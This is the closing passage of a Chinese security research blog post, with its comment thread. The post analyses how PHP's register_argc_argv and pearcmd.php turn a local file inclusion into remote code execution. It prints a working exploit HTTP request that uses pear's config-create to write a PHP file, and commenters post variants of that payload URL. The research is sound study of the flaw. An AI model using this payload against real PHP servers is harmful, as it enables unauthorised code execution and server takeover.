<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="n">zend_bool</span> <span class="nf">php_auto_globals_create_server</span><span class="p">(</span><span class="n">zend_string</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">variables_order</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">strchr</span><span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">variables_order</span><span class="p">),</span><span class="sc">&#39;S&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="n">strchr</span><span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">variables_order</span><span class="p">),</span><span class="sc">&#39;s&#39;</span><span class="p">)))</span> <span class="p">{</span>
        <span class="n">php_register_server_variables</span><span class="p">();</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">register_argc_argv</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">SG</span><span class="p">(</span><span class="n">request_info</span><span class="p">).</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">zval</span> <span class="o">*</span><span class="n">argc</span><span class="p">,</span> <span class="o">*</span><span class="n">argv</span><span class="p">;</span>

                <span class="k">if</span> <span class="p">((</span><span class="n">argc</span> <span class="o">=</span> <span class="n">zend_hash_find_ex_ind</span><span class="p">(</span><span class="o">&amp;</span><span class="n">EG</span><span class="p">(</span><span class="n">symbol_table</span><span class="p">),</span> <span class="n">ZSTR_KNOWN</span><span class="p">(</span><span class="n">ZEND_STR_ARGC</span><span class="p">),</span> <span class="mi">1</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span>
                    <span class="p">(</span><span class="n">argv</span> <span class="o">=</span> <span class="n">zend_hash_find_ex_ind</span><span class="p">(</span><span class="o">&amp;</span><span class="n">EG</span><span class="p">(</span><span class="n">symbol_table</span><span class="p">),</span> <span class="n">ZSTR_KNOWN</span><span class="p">(</span><span class="n">ZEND_STR_ARGV</span><span class="p">),</span> <span class="mi">1</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">Z_ADDREF_P</span><span class="p">(</span><span class="n">argv</span><span class="p">);</span>
                    <span class="n">zend_hash_update</span><span class="p">(</span><span class="n">Z_ARRVAL</span><span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_SERVER</span><span class="p">]),</span> <span class="n">ZSTR_KNOWN</span><span class="p">(</span><span class="n">ZEND_STR_ARGV</span><span class="p">),</span> <span class="n">argv</span><span class="p">);</span>
                    <span class="n">zend_hash_update</span><span class="p">(</span><span class="n">Z_ARRVAL</span><span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_SERVER</span><span class="p">]),</span> <span class="n">ZSTR_KNOWN</span><span class="p">(</span><span class="n">ZEND_STR_ARGC</span><span class="p">),</span> <span class="n">argc</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">php_build_argv</span><span class="p">(</span><span class="n">SG</span><span class="p">(</span><span class="n">request_info</span><span class="p">).</span><span class="n">query_string</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_SERVER</span><span class="p">]);</span>
            <span class="p">}</span>
        <span class="p">}</span>

    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">zval_ptr_dtor_nogc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_SERVER</span><span class="p">]);</span>
        <span class="n">array_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_SERVER</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="p">...</span>
</code></pre></div>

<p>第一个if语句判断<code>variables_order</code>中是否有<code>S</code>，即<code>$_SERVER</code>变量；第二个if语句判断是否开启register_argc_argv，第三个if语句判断是否有request_info.argc存在，如果不存在，其执行的是这条语句：</p>
<div class="codehilite"><pre><span></span><code><span class="n">php_build_argv</span><span class="p">(</span><span class="n">SG</span><span class="p">(</span><span class="n">request_info</span><span class="p">).</span><span class="n">query_string</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_SERVER</span><span class="p">]);</span>
</code></pre></div>

<p>无论php_build_argv函数内部是怎么处理的，<code>SG(request_info).query_string</code>都非常吸引我，这段代码是否意味着，HTTP数据包中的query-string会被作为argv的值？</p>
<p>果然：</p>
<p><a href="../media/attachment/2021/11/01/27b750f3-bc90-46b9-b6de-0e21425f57d3.png"><img alt="image.png" src="../media/attachment/2021/11/01/27b750f3-bc90-46b9-b6de-0e21425f57d3.fdc8394951d5.png" /></a></p>
<p>其实这个结果是符合<a href="http://www.ietf.org/rfc/rfc3875" target="_blank">RFC3875</a>的：</p>
<blockquote>
<p>4.4.  The Script Command Line</p>
<p>Some systems support a method for supplying an array of strings to<br />
the CGI script.  This is only used in the case of an 'indexed' HTTP<br />
query, which is identified by a 'GET' or 'HEAD' request with a URI<br />
query string that does not contain any unencoded "=" characters.  For<br />
such a request, the server SHOULD treat the query-string as a<br />
search-string and parse it into words, using the rules</p>
<p>search-string = search-word <em>( "+" search-word )<br />
   search-word   = 1</em>schar<br />
   schar         = unreserved | escaped | xreserved<br />
   xreserved     = ";" | "/" | "?" | ":" | "@" | "&amp;" | "=" | "," |<br />
                   "$"</p>
<p>After parsing, each search-word is URL-decoded, optionally encoded in<br />
a system-defined manner and then added to the command line argument<br />
list.</p>
</blockquote>
<p>RFC3875中规定，如果query-string中不包含没有编码的<code>=</code>，且请求是GET或HEAD，则query-string需要被作为命令行参数。</p>
<p>当年PHP-CGI曾在这上面栽过跟头，具体的细节可以参考我以前写的这篇文章：《<a href="php-cgi-cve-2012-1823.html" target="_blank">PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析</a>》。PHP现在仍然没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给<code>$_SERVER['argv']</code>。</p>
<p>我们再来看到pear中获取命令行argv的函数：</p>
<div class="codehilite"><pre><span></span><code><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">readPHPArgv</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">global</span> <span class="nv">$argv</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$argv</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;HTTP_SERVER_VARS&#39;</span><span class="p">][</span><span class="s1">&#39;argv&#39;</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span><span class="p">;</span>
                <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&quot;Console_Getopt: &quot;</span> <span class="o">.</span> <span class="nv">$msg</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;HTTP_SERVER_VARS&#39;</span><span class="p">][</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$argv</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER['argv']</code>，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数。</p>
<p>看看pear中有哪些可以利用的参数：</p>
<p><a href="../media/attachment/2021/11/01/5b0b1d97-f739-4d67-b98b-82a6d889bd2c.png"><img alt="image.png" src="../media/attachment/2021/11/01/5b0b1d97-f739-4d67-b98b-82a6d889bd2c.3c9823576498.png" /></a></p>
<p>第一眼就看到config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
<p>所以，我构造出最后的利用数据包如下：</p>
<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.1.162:8080</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</code></pre></div>

<p><a href="../media/attachment/2021/11/01/25526495-da6c-4961-899a-0ca4c6c125bf.png"><img alt="image.png" src="../media/attachment/2021/11/01/25526495-da6c-4961-899a-0ca4c6c125bf.d5051ae197a8.png" /></a></p>
<p>发送这个数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code>：</p>
<p><a href="../media/attachment/2021/11/01/8b834c20-e2bf-434e-a013-b88f518a6ca4.png"><img alt="image.png" src="../media/attachment/2021/11/01/8b834c20-e2bf-434e-a013-b88f518a6ca4.171db8cd1318.png" /></a></p>
<p>然后，我们再利用文件包含漏洞包含这个文件即可getshell：</p>
<p><a href="../media/attachment/2021/11/01/6d4093d4-1c7f-4433-86bb-ee0bb3446359.png"><img alt="image.png" src="../media/attachment/2021/11/01/6d4093d4-1c7f-4433-86bb-ee0bb3446359.34a26b4a0765.png" /></a></p>
<p>最后这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是Docker启动的PHP环境即可通过上述一个数据包搞定。</p>
<h2 id="0x07"><a class="toclink" href="#0x07">0x07 参考链接</a></h2>
<ul>
<li>https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf</li>
<li>http://www.madchat.fr/coding/php/secu/onsec.whitepaper-02.eng.pdf</li>
<li>https://stackoverflow.com/questions/24190389/findfirstfile-undocumented-wildcard-or-bug</li>
<li>https://stackoverflow.com/questions/2563316/findfirstfileex-wildcard-characters</li>
<li>https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-_fsrtl_advanced_fcb_header-fsrtlisnameinexpression</li>
<li>https://www.jianshu.com/p/dfd049924258</li>
<li>https://bugs.php.net/bug.php?id=77231</li>
<li>http://www.ietf.org/rfc/rfc3875</li>
</ul>
          </div>
        </article>

        
          <h1 class="h1 color-main">赞赏</h1>
          <div class="zan text-center">
            <p>喜欢这篇文章？打赏1元</p>
            <p class="m-0"><img src="../static/wx.jpg" width="280" alt=""></p>
          </div>
        

        <div id="reply-list">
          <h1 class="h1 color-main">评论</h1>
          
            
              <div class="flex mb-2" id="comment-4037">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">~~</a>
                    <time datetime="2022年12月14日 16:10" itemprop="datePublished">
                      2022 十二月 14 16:10
                    </time>
                    <a href="javascript:reply_to('4037', '~~')">回复</a>
                  </p>
                  <p class="comment-meta">从最近tp的RCE过来学习P神去年的神作</p>
                </div>
              </div>
              
            
              <div class="flex mb-2" id="comment-4025">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">Ttoc</a>
                    <time datetime="2022年11月20日 15:06" itemprop="datePublished">
                      2022 十一月 20 15:06
                    </time>
                    <a href="javascript:reply_to('4025', 'Ttoc')">回复</a>
                  </p>
                  <p class="comment-meta">P神太强了</p>
                </div>
              </div>
              
            
              <div class="flex mb-2" id="comment-3718">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">B0T1</a>
                    <time datetime="2021年11月21日 21:50" itemprop="datePublished">
                      2021 十一月 21 21:50
                    </time>
                    <a href="javascript:reply_to('3718', 'B0T1')">回复</a>
                  </p>
                  <p class="comment-meta">师傅好，当我在虚拟机上测试时，在虚拟机火狐上输入这个网址http://localhost:8080/test.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/3.php，由于&lt;&gt;自动url转码成了%3C?=phpinfo()?%3E，导致文件包含该php文件时不能识别php代码而失败，请问这个怎么解决呢？</p>
                </div>
              </div>
              
                
                  <div class="child-node">
              <div class="flex mb-2" id="comment-3719">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">B0T1</a>
                    <time datetime="2021年11月21日 21:51" itemprop="datePublished">
                      2021 十一月 21 21:51
                    </time>
                    <a href="javascript:reply_to('3719', 'B0T1')">回复</a>
                  </p>
                  <p class="comment-meta">@B0T1 是关于最后一个pearcmd.php的巧妙利用的试验</p>
                </div>
              </div>
              
            
              <div class="flex mb-2" id="comment-3720">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="https://www.leavesongs.com" target="_blank" rel="nofollow noopener">phithon</a>
                    <time datetime="2021年11月21日 21:54" itemprop="datePublished">
                      2021 十一月 21 21:54
                    </time>
                    <a href="javascript:reply_to('3720', 'phithon')">回复</a>
                  </p>
                  <p class="comment-meta">@B0T1 可以尝试使用burpsuite发送数据包。</p>
                </div>
              </div>
              
                
                  <div class="child-node">
              <div class="flex mb-2" id="comment-3723">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">B0T1</a>
                    <time datetime="2021年11月22日 21:42" itemprop="datePublished">
                      2021 十一月 22 21:42
                    </time>
                    <a href="javascript:reply_to('3723', 'B0T1')">回复</a>
                  </p>
                  <p class="comment-meta">@phithon 嗯，可以了，感谢师傅</p>
                </div>
              </div>
              
            
              <div class="flex mb-2" id="comment-3724">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">B0T1</a>
                    <time datetime="2021年11月23日 17:57" itemprop="datePublished">
                      2021 十一月 23 17:57
                    </time>
                    <a href="javascript:reply_to('3724', 'B0T1')">回复</a>
                  </p>
                  <p class="comment-meta">@phithon 师傅，文章构造数据包payload执行后最后写入文件的是/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;/pear/..<br>改成这样的顺序:`GET /index.php?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=phpinfo();?&gt;+/tmp/1.php`会不会更清晰好理解一点?（插入文件内容只有/&lt;?=phpinfo()?&gt;/pear/..）</p>
                </div>
              </div>
              
            </div>
                
              
            </div>
                
              
            
              <div class="flex mb-2" id="comment-3714">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">BSOD</a>
                    <time datetime="2021年11月7日 21:47" itemprop="datePublished">
                      2021 十一月 07 21:47
                    </time>
                    <a href="javascript:reply_to('3714', 'BSOD')">回复</a>
                  </p>
                  <p class="comment-meta">P神太强了</p>
                </div>
              </div>
              
            
          
        </div>

        

        <form method="post" enctype="multipart/form-data" action="#reply" id="reply" class="mb-4">
          <div class="container-fluid px-0">
            
            <div class="row">
              <div class="col">
                <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
              </div>
            </div>
            <div class="row gx-2">
              <div class="col-4">
                <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
              </div>
              <div class="col-4">
                <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
              </div>
              <div class="col-4">
                <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
              </div>
            </div>
          </div>
          <div class="row">
            <div class="col-4">
              <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="9a5099b91fa1bddfe5c230798e9b0055eff1fbdb" />
</div><div class="col-6">
<img src="../captcha/image/9a5099b91fa1bddfe5c230798e9b0055eff1fbdb/index.png" alt="captcha" class="captcha" /></div></div>
            </div>
          </div>
          <div class="row">
            <div class="col">
              <input type="submit" class="ui-button ui-button-sgreen" value="提交">
            </div>
          </div>
          <input type="hidden" name="archive" value="471" id="id_archive">
          <input type="hidden" name="parent" id="id_parent">
          <input type="hidden" name="csrfmiddlewaretoken" value="HAKlvm2B2NfXRm0RQ7q7omHj9tzn9OEpt88c3rDkq9tGpUOfS8nSlPKouQQyIqQH">
        </form>
      </div>
    </div>
    <div class="row justify-content-center">
      <div class="col-lg-7 col-md-10 col-sm-12">
        <footer class="footer mx-auto">
  <div class="footer-left">
    Copyright &copy; 2023 Powered by talkbook
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <li><a href="../index.html">首页</a></li>
        <li><a href="../feed/index.rss" target="_blank">RSS订阅</a></li>
        <li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
        <li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
        <li><a href="../index.html">更换模板</a></li>
      </ul>
    </nav>
  </div>
</footer>
      </div>
    </div>
  </div>

<script src="https://cdn.staticfile.org/jquery/2.2.4/jquery.min.js"></script>
<script src="../static/cactus/js/main%EF%B9%96v=2021102502.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-FF5KPQ1CZ6');
</script>

  <script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
  <script>
      $(document).ready(function () {
          $(".content a").each(function (i, e) {
              if (e.host != 'www.leavesongs.com') {
                  e.target = '_blank';
              }
          });
          $(".content img").each(function (i, e) {
              if (e.parentNode.tagName.toUpperCase() != 'A') {
                  $(e).wrap('<a href="' + escapeHtml(e.src) + '" class="fancybox"></a>');
              } else {
                  $(e.parentNode).addClass('fancybox');
              }
          });
          $('.fancybox').fancybox();
      })
  </script>

</body>
</html>